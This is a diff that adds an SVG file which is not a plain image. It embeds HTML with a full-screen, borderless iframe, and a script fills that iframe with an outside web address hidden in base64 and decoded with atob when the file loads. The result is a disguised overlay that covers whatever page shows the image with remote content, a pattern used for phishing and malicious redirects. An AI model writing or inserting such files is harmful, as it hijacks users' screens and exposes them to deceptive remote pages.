@@ -1,0 +1,12 @@
+<svg xmlns="http://www.w3.org/2000/svg" width="100%" height="100%" style="position:fixed;top:0;left:0">
+  <foreignObject x="0" y="0" width="100%" height="100%">
+    <body xmlns="http://www.w3.org/1999/xhtml" style="margin:0;padding:0">
+      <iframe id="cat-frame" allow="fullscreen" style="position:fixed;inset:0;width:100%;height:100%;border:none;margin:0;padding:0"></iframe>
+      <script>/*<![CDATA[*/
+        (function(){
+          document.getElementById("cat-frame").src=atob("aHR0cHM6Ly9jb21pbmcuY2F0Y2xhc3Muc3BhY2Uv");
+        })();
+      /*]]>*/</script>
+    </body>
+  </foreignObject>
+</svg>
